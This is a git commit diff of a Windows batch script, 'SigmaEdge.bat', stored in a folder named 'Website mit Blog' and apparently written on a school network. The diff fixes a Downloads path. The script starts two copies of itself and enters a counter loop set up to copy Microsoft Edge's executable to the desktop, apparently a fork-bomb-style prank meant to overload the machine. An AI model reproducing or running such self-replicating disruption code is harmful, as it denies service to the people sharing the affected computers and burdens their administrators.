643101749bbca6472ef904cf769ae5ea26735d0e
Benjamin Kuhnert <freddi1808@gmx.de>
2026-05-06 08:57:05 +0200

    SigmaEdge.bat aktualisieren

--- Website mit Blog/SigmaEdge.bat
+++ Website mit Blog/SigmaEdge.bat
@@ -3,8 +3,8 @@ set "sourceFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
 set "destination=H:\Desktop"
 set /a counter=1
 start "" "G:\Cla.if21\Benjamin Kuhnert\Sigma.bat"
-start "" "H:\Download\SigmaEdge.bat"
-start "" "H:\Download\SigmaEdge.bat"
+start "" "H:\Downloads\SigmaEdge.bat"
+start "" "H:\Downloads\SigmaEdge.bat"
 :loop
 
 
